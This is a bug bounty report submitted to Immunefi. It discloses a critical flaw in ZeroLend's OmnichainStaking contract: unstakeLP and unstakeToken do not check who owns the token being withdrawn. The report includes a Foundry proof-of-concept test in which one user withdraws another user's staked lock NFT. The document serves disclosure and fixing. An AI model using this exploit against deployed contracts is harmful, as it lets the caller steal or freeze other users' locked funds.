# 29135 - \[SC - Critical] OmnichainStakingsolunstakeLP and OmnichainStaki...

Submitted on Mar 8th 2024 at 07:52:20 UTC by @jovi for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #29135

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/zerolend/governance>

Impacts:

* Direct theft of any user NFTs, whether at-rest or in-motion, other than unclaimed royalties
* Temporary freezing of funds for at least 1 hour
* Permanent freezing of funds

## Description

## Brief/Intro

The unstakeLP and the unstakeToken functions at the OmnichainStaking contracts allow a user to burn ZEROvp tokens in order to get back user-defined tokenIds. This enables malicious parties to unstake tokens they don't rightfully own.

## Vulnerability Details

If we take a look at both unstaking functions, there are no checks to ensure the transaction caller has any right to that token id, rather the functions check if the caller owns enough ZEROvp token to be burnt.

```solidity
function unstakeLP(uint256 tokenId) external {
        _burn(msg.sender, lpPower[tokenId] * 4);
        lpLocker.safeTransferFrom(address(this), msg.sender, tokenId);
    }

    function unstakeToken(uint256 tokenId) external {
        _burn(msg.sender, tokenPower[tokenId]);
        tokenLocker.safeTransferFrom(address(this), msg.sender, tokenId);
    }
```

This is not necessarily an issue if taken only at the OmnichainStaking contract context. However, considering different NFTs have different lock expiries at both the LockerToken and the LockerLP contracts, malicious parties can unstake token ids to benefit in different forms, as shown at the impact section.

## Impact Details

Users can receive tokens before their lock expiry ends by unstaking ERC-721 tokens that have earlier expiry without the authorization of their rightful owners. This leads to the freezing of user funds that can be never-ending as other people can claim before the rightful owner.

## References

unstakeLP and unstakeToken functions at OmnichainStaking.sol: <https://github.com/zerolend/governance/blob/main/contracts/locker/OmnichainStaking.sol#L76C5-L84C6>

votingPowerOf and calculatePower functions at BaseLocker.sol: <https://github.com/zerolend/governance/blob/main/contracts/locker/BaseLocker.sol#L103C5-L116C6>

## Proof of concept

Paste the following code snippet inside the test folder:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {console} from "../../lib/forge-std/src/console.sol";
import {StdInvariant} from "../../lib/forge-std/src/StdInvariant.sol";
import {LockerLP} from "../../locker/LockerLP.sol";
import {LockerToken} from "../../locker/LockerToken.sol";
import {OmnichainStaking} from "../../locker/OmnichainStaking.sol";
import {Test} from "../../lib/forge-std/src/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MintableERC20 is ERC20 {
    address public owner;

    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "MintableERC20: caller is not the owner");
        _;
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}

contract ZeroLendTest is StdInvariant, Test {

    LockerLP lockerLP;
    LockerToken lockerToken;
    OmnichainStaking omnichainStaking;
    MintableERC20  arbitraryToken;
    address user = makeAddr("user");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address public configurator = makeAddr("configurator");
    uint256 internal WEEK;
    uint256 internal MAXTIME;

    function setUp() public {
        vm.prank(configurator);
        arbitraryToken = new MintableERC20("Arbitrary Token", "ATKN");
        vm.prank(configurator);
        arbitraryToken.mint(user, 1 ether);
        vm.prank(configurator);
        arbitraryToken.mint(alice, 1 ether);
        vm.prank(configurator);
        arbitraryToken.mint(bob, 1 ether);


        vm.prank(configurator);
        lockerLP = new LockerLP();

        lockerLP.init(
            address(arbitraryToken),
            // staking address
            address(0x1000),
            // stakingBonus
            address(0x1001)
        );

        lockerToken = new LockerToken();
        lockerToken.init(
            address(arbitraryToken),
            // staking address
            address(0x1000),
            // stakingBonus
            address(0x1001)
        );

        omnichainStaking = new OmnichainStaking();
        omnichainStaking.init(
            // LZ endpoint
            address(0x1002),
            // tokenLocker
            address(lockerToken),
            // lpLocker
            address(lockerLP)
        );

        WEEK = 1 weeks;
        MAXTIME = 365 * 86400;

    }

    function test_poc1() public {

        vm.prank(alice);
        arbitraryToken.approve(address(lockerLP), 1 ether);
        vm.prank(bob);
        arbitraryToken.approve(address(lockerLP), 1 ether);

        uint256 unlockTime0 = ((block.timestamp + MAXTIME) / WEEK) * WEEK - 100; // Locktime is rounded down to weeks
        vm.prank(alice);
        lockerLP.createLock(0.5 ether, unlockTime0, false);

        // pass 2 weeks
        vm.warp(block.timestamp + 2 * WEEK);

        uint256 unlockTime1 = unlockTime0  + 1 * WEEK; // Locktime is rounded down to weeks
        vm.prank(bob);
        lockerLP.createLock(0.5 ether, unlockTime1, false);

        // transfer both tokens to the omnichainStaking contract
        vm.prank(alice);
        lockerLP.safeTransferFrom(alice, address(omnichainStaking), 1);

        vm.prank(bob);
        lockerLP.safeTransferFrom(bob, address(omnichainStaking), 2);

        // get the lock 1 expiry
        (, uint256 end,,) = lockerLP.locked(1);

        // travel to the expiry period + 1 day
        vm.warp(end + 1 days);

        require(end < block.timestamp);

        // bob will unstake alice's token and be able to withdraw the token at the lockerLp contract.
        vm.prank(bob);
        omnichainStaking.unstakeLP(1);

        // alice will try to unstake her token and fail
        vm.prank(alice);
        vm.expectRevert();
        omnichainStaking.unstakeLP(1);

        // alice will end be able to unstake bob's token, but notice how it is still locked at the lockerLp contract
        (,end,,) = lockerLP.locked(2);
        require(end > block.timestamp);


       }

}
```

Run the test with the following command:

```shell
forge test --match-test test_poc1 -vvv
```
